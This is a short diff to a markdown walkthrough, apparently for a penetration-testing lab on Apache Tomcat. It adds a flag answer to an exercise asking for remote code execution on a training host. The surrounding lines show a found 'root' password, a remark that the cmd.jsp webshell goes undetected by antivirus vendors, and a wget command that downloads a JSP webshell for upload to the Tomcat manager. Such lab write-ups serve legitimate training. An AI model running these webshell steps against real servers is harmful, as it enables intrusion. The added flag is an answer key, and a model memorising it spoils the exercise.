@@ -94,7 +94,7 @@ results in 0/58 security vendors flagging the `cmd.jsp` file as malicious at the
         [*] Auxiliary module execution completed
         ```
 2. What is the password? **Answer: root**
-3. Obtain remote code execution on the http://web01.inlanefreight.local:8180 Tomcat instance. Find and submit the contents of tomcat_flag.txt **Answer:**
+3. Obtain remote code execution on the http://web01.inlanefreight.local:8180 Tomcat instance. Find and submit the contents of tomcat_flag.txt **Answer: t0mcat_rc3_ftw!**
    - Login to the manager account and upload the webshell:
         ```shellsession
         $ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
